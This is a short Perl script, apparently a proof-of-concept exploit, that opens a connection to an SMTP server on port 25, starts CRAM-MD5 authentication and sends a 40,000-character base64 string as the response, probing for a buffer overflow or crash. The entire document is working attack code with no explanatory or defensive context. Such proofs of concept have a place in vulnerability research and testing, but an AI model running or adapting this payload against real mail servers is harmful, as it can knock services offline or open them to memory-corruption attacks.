use IO::Socket;
use MIME::Base64;
$|=1;
$host = "localhost";
$a = "QUFB" x 10000;
my $sock = IO::Socket::INET->new(PeerAddr => "$host",
PeerPort => '25',
Proto => 'tcp');
print $sock "EHLO you\r\n";
print $sock "AUTH CRAM-MD5\r\n";
print $sock $a . "\r\n";
while(<$sock>) {
print;
}


